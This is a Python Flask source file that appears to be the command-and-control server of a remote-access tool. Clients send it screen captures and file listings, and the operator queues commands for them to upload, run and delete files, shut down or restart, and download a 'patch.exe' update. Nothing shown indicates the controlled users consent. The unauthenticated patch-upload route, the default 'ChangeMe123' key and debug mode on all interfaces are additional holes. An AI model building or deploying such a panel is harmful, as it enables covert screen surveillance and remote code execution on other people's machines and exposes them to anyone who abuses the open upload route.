from flask import Flask, render_template, request, jsonify, redirect, url_for,send_from_directory,Response
import time
import threading
import os

from werkzeug.utils import secure_filename
VERSION_FILE = os.path.join(os.path.abspath(os.path.dirname(__file__)), "version.txt")

def get_current_version():
    if not os.path.exists(VERSION_FILE):
        with open(VERSION_FILE, "w") as f:
            f.write("1")  # Default starting version
        return "1"
    with open(VERSION_FILE, "r") as f:
        return f.read().strip()

def save_version(number):
    with open(VERSION_FILE, "w") as f:
        f.write(str(number).strip())
# --- CONFIGURATION ---
# Define the directory where patches will be stored
PATCH_DIR = os.path.join(os.path.abspath(os.path.dirname(__file__)), "patches")

# Ensure the directory exists when the server starts
if not os.path.exists(PATCH_DIR):
    os.makedirs(PATCH_DIR)


# --- NEW ROUTE HOOKS ---

app = Flask(__name__)
liveusers = {}

class LiveUser:
    def __init__(self, address):
        self.address = address
        self.lastinput = time.time()
        self.is_alive = True
        self.current_frame = None  
        self.current_files = []        # List of items inside the currently viewed directory: [{"name": "x", "is_directory": True/False}]
        self.viewing_directory = "/"    # Tracks the exact directory path the user is viewing
        self.pending_command = None    # Stores general system control functions (Shutdown/Restart)
        self.pending_file_ops = []     # Queues dynamic file manager operations for the client to grab
        
        print(f"Live session initialized for {address}")
        self.thread = threading.Thread(target=self._monitor_loop, daemon=True)
        self.thread.start()

    def ping(self, frame_data=None, frame_files=None):
        self.lastinput = time.time()
        if frame_data:
            self.current_frame = frame_data  
        if frame_files is not None:
            self.current_files = frame_files  
        print(f"[{self.address}] Session status verified.")

    def _monitor_loop(self):
        while self.is_alive:
            if time.time() - self.lastinput > 10:
                print(f"[{self.address}] Timeout reached. Cleaning session.")
                self.disconnect()
                break
            time.sleep(1)

    def disconnect(self):
        self.is_alive = False
        if str(self.address) in liveusers:
            del liveusers[str(self.address)]

def get_ip():
    x_forwarded = request.headers.get("X-Forwarded-For")
    if x_forwarded:
        return x_forwarded.split(",")[0].strip()
    return request.remote_addr


# --- ACCESS RULES ---
KEY_FILE = "KEY.TXT"
if not os.path.exists(KEY_FILE):
    with open(KEY_FILE, "w") as f:
        f.write("ChangeMe123")

with open(KEY_FILE, "r") as f:
    SITE_SECRET_KEY = f.read().strip()


@app.before_request
def restrict_access():
    # These must match the exact def names of your functions
    allowed_routes = ["login", "submit_key", "live", "patch_upload", "get_patch","get_patch_version"]
    
    if request.endpoint in allowed_routes:
        return
        
    user_cookie = request.cookies.get("site_access_token")
    if user_cookie != SITE_SECRET_KEY:
        return redirect(url_for("login"))

@app.route("/patch_number", methods=["GET"])
def get_patch_version():
    current_ver = get_current_version()
    return jsonify({
        "status": "success",
        "patch_number": current_ver
    })

@app.route("/patch", methods=["GET", "POST"])
def patch_upload():
    if request.method == "POST":
        if "patch_file" not in request.files:
            return jsonify({"status": "error", "message": "No file part in the request"}), 400
            
        file = request.files["patch_file"]
        version_input = request.form.get("version_number", "").strip()
        
        if file.filename == "":
            return jsonify({"status": "error", "message": "No file selected"}), 400
            
        if not version_input:
            return jsonify({"status": "error", "message": "No version number provided"}), 400
            
        if file:
            # Save the file
            target_path = os.path.join(PATCH_DIR, "patch.exe")
            file.save(target_path)
            
            # Save the new version sequence to the version text file
            save_version(version_input)
            
            return jsonify({
                "status": "success", 
                "message": f"Patch uploaded successfully as version {version_input}"
            })

    # Updated inline interface containing the version assignment input
    current_ver = get_current_version()
    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Upload Patch</title>
        <style>
            body {{ background: #0d0e15; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
            .upload-box {{ background: #1a1c2e; padding: 30px; border-radius: 8px; border: 1px solid #2e3152; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5); width: 320px; }}
            input[type="file"] {{ margin: 15px 0; color: #a0aec0; }}
            input[type="text"] {{ background: #0d0e15; border: 1px solid #2e3152; color: white; padding: 10px; border-radius: 4px; width: 90%; text-align: center; margin-bottom: 20px; }}
            button {{ background: #3b82f6; color: white; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; width: 100%; font-size: 1rem; font-weight: bold; }}
            button:hover {{ background: #2563eb; }}
            p {{ color: #a0aec0; font-size: 0.9rem; }}
        </style>
    </head>
    <body>
        <div class="upload-box">
            <h2>UPGRADE SYSTEM PATCH</h2>
            <p>Current Server Version: <strong>{current_ver}</strong></p>
            <form action="/patch" method="POST" enctype="multipart/form-data">
                <input type="text" name="version_number" placeholder="New Version (e.g., 2 or 1.0.4)" required autocomplete="off">
                <input type="file" name="patch_file" required autocomplete="off"><br>
                <button type="submit">UPLOAD & APPLY</button>
            </form>
        </div>
    </body>
    </html>
    """

@app.route("/getpatch", methods=["GET"])
def get_patch():
    target_path = os.path.join(PATCH_DIR, "patch.exe")
    
    if not os.path.exists(target_path):
        return jsonify({"status": "error", "message": "Patch file not found on server"}), 404

    # 1. Create a generator that reads the file in binary mode from the server's disk
    def generate_file_stream():
        with open(target_path, "rb") as f:
            while True:
                chunk = f.read(16384) # 16KB blocks
                if not chunk:
                    break
                yield chunk

    # 2. Grab the exact file size on disk to provide a proper header
    file_size = os.path.getsize(target_path)

    # 3. Stream the response directly over the socket connection
    response = Response(generate_file_stream(), mimetype="application/octet-stream")
    response.headers["Content-Length"] = file_size
    response.headers["Content-Disposition"] = "attachment; filename=patch.exe"
    
    print(f"[Server] Streaming patch.exe raw binary ({file_size} bytes) directly to client...")
    return response

# --- FILE MANAGER DATA SYNC & STATE MANIPULATION ---

@app.route("/files/<address>/list", methods=["GET"])
def list_files(address):
    thisip = str(address)
    if thisip not in liveusers:
        liveusers[thisip] = LiveUser(address=thisip)
        
    user = liveusers[thisip]
    return jsonify({
        "status": "success", 
        "files": user.current_files,
        "viewing_directory": user.viewing_directory
    })

@app.route("/files/<address>/navigate", methods=["POST"])
def navigate_directory(address):
    user = liveusers.get(address)
    if not user:
        return jsonify({"status": "error", "message": "User offline"}), 404
        
    data = request.get_json() or {}
    destination = data.get("destination")
    
    # Appends a navigation directive to the client command loop
    user.pending_file_ops.append({
        "op": "navigate",
        "destination": destination
    })
    return jsonify({"status": "success", "queued": "navigate"})


# --- COMPONENT IMPLEMENTATION ROUTE HOOKS ---

@app.route("/files/<address>/upload", methods=["POST"])
def upload_file(address):
    user = liveusers.get(address)
    if "file" not in request.files:
        return jsonify({"status": "error", "message": "No file chunk passed"})
    
    file_payload = request.files["file"]
    
    # Files are data-heavy, so instead of queuing a command, we can notify the client 
    # about an incoming file payload structure by dropping it into the task loop.
    user.pending_file_ops.append({
        "op": "upload",
        "filename": file_payload.filename,
        "raw_bytes": file_payload.read().hex() # Convert to string format safe for transmission
    })
    return jsonify({"status": "queued", "filename": file_payload.filename})

@app.route("/files/<address>/create_dir", methods=["POST"])
def create_directory(address):
    user = liveusers.get(address)
    data = request.get_json() or {}
    folder_name = data.get("name")
    
    user.pending_file_ops.append({
        "op": "create_dir", 
        "name": folder_name
    })
    return jsonify({"status": "queued"})

@app.route("/files/<address>/rename", methods=["POST"])
def rename_item(address):
    user = liveusers.get(address)
    data = request.get_json() or {}
    
    user.pending_file_ops.append({
        "op": "rename", 
        "old_name": data.get("old_name"), 
        "new_name": data.get("new_name")
    })
    return jsonify({"status": "queued"})

@app.route("/files/<address>/move", methods=["POST"])
def move_item(address):
    user = liveusers.get(address)
    data = request.get_json() or {}
    
    user.pending_file_ops.append({
        "op": "move", 
        "target": data.get("target"), 
        "dest": data.get("dest")
    })
    return jsonify({"status": "queued"})

@app.route("/files/<address>/delete", methods=["POST"])
def delete_item(address):
    user = liveusers.get(address)
    data = request.get_json() or {}
    
    user.pending_file_ops.append({
        "op": "delete", 
        "target": data.get("target")
    })
    return jsonify({"status": "queued"})

@app.route("/files/<address>/run", methods=["POST"])
def run_item(address):
    user = liveusers.get(address)
    data = request.get_json() or {}
    
    user.pending_file_ops.append({
        "op": "run", 
        "target": data.get("target")
    })
    return jsonify({"status": "queued"})

@app.route("/files/<address>/zip", methods=["POST"])
def zip_item(address):
    user = liveusers.get(address)
    data = request.get_json() or {}
    
    user.pending_file_ops.append({
        "op": "zip", 
        "target": data.get("target")
    })
    return jsonify({"status": "queued"})

@app.route("/files/<address>/unzip", methods=["POST"])
def unzip_item(address):
    user = liveusers.get(address)
    data = request.get_json() or {}
    
    user.pending_file_ops.append({
        "op": "unzip", 
        "target": data.get("target")
    })
    return jsonify({"status": "queued"})


# --- STANDARD TEMPLATE RENDERS ---

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        entered_key = request.form.get("auth_key", "").strip()
        if entered_key == SITE_SECRET_KEY:
            response = redirect(url_for("home"))
            response.set_cookie("site_access_token", SITE_SECRET_KEY, httponly=True)
            return response
        return redirect(url_for("login", error=1))
    
    return """
    <!DOCTYPE html>
    <html><head><title>Access Required</title><style>body{background:#0d0e15;color:white;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}.login-box{background:#1a1c2e;padding:30px;border-radius:8px;border:1px solid #2e3152;text-align:center;}input{background:#0d0e15;border:1px solid #3b82f6;color:white;padding:12px;border-radius:4px;width:200px;margin-bottom:15px;text-align:center;}button{background:#3b82f6;color:white;border:none;padding:12px 24px;border-radius:4px;cursor:pointer;width:100%;font-size:1rem;}</style></head>
    <body><div class="login-box"><h2>ENTER ACCESS KEY</h2><form action="/login" method="POST"><input type="password" name="auth_key" placeholder="Key string..." required autocomplete="off"><br><button type="submit">VALIDATE</button></form></div></body></html>
    """

@app.route("/")
def home():
    return render_template("index.html", users=liveusers.keys())

@app.route("/watch/<address>")
def watch(address):
    return render_template("watch.html", address=address)

@app.route("/stream_data/<address>")
def stream_data(address):
    user = liveusers.get(address)
    if user and user.current_frame:
        return jsonify({"image": user.current_frame})
    return jsonify({"image": ""})

@app.route("/control/<address>", methods=["POST"])
def control(address):
    user = liveusers.get(address)
    if not user: return jsonify({"status": "error"}), 404
    data = request.get_json() or {}
    user.pending_command = data.get("action")
    return jsonify({"status": "success"})


# --- TRANSMISSION RECEIVER ---

@app.route("/live", methods=["POST"])
def live():
    client_data = request.get_json() or {}
    thisip = str(get_ip())
    frame_data = client_data.get("frame") 
    
    file_data = client_data.get("directory_items", [])
    client_current_dir = client_data.get("current_directory", "/")

    if thisip not in liveusers:
        liveusers[thisip] = LiveUser(address=thisip)
        
    user = liveusers[thisip]
    user.viewing_directory = client_current_dir
    user.ping(frame_data=frame_data, frame_files=file_data)

    # Pop tracking operations out to dispatch down to the home client script
    command_to_send = user.pending_command
    user.pending_command = None 
    
    ops_to_send = list(user.pending_file_ops)
    user.pending_file_ops.clear()
    
    return jsonify({
        "status": "success",
        "command": command_to_send,
        "file_operations": ops_to_send,  # <--- Array containing your structured tasks
        "address":thisip,
    })

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)